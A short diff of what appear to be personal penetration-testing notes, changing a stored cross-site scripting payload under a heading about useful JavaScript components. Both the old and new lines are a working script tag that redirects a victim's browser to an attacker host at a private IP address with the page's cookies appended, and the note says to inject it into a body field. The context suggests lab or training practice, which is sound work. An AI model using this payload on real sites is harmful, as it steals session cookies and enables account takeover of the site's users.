@@ -79,7 +79,7 @@ Useful JavaScript Components
 
 this creates a hole for information to go into when i inject the below script 
 
-## <script>document.location="https://10.50.29.68:80?"+document.cookie;</script> ##
+## <script>document.location="http://10.50.29.68:8000/"+document.cookie;</script> ##
 
 ^^^^^ input this into a body function ^^^^
 
